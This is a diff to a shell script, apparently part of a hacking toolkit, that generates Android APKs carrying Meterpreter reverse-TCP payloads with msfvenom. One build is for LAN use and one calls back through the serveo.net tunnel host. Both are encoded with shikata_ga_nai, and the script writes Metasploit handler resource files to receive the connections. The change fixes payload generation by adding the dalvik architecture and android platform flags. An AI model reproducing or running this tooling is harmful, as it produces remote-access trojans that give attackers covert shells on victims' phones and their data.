@@ -199,7 +199,7 @@ elif [ $1 = apk ] && [ $2 ]; then
 		if [ ! -d ~/java/handler ]; then
 			mkdir -p ~/java/handler
 		fi
-		msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCALHOST LPORT=4546 -e x86/shikata_ga_nai -i 5 -o inlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
+		msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCALHOST LPORT=4546 -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o inlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
 		echo "use exploit/multi/handler" > ~/java/handler/inlan.apk.rc
 		echo "set PAYLOAD android/meterpreter/reverse_tcp" >> ~/java/handler/inlan.apk.rc
 		echo "set LHOST $LOCALHOST" >> ~/java/handler/inlan.apk.rc
@@ -212,7 +212,7 @@ elif [ $1 = apk ] && [ $2 ]; then
 		if [ ! -d ~/java/handler ]; then
 			mkdir -p ~/java/handler
 		fi
-		msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=48263 -e x86/shikata_ga_nai -i 5 -o outlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n" 
+		msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=48263 -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o outlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n" 
 		echo "use exploit/multi/handler" > ~/java/handler/outlan.apk.rc
 		echo "set PAYLOAD android/meterpreter/reverse_tcp" >> ~/java/handler/outlan.apk.rc
 		echo "set LHOST $LOCALHOST" >> ~/java/handler/outlan.apk.rc
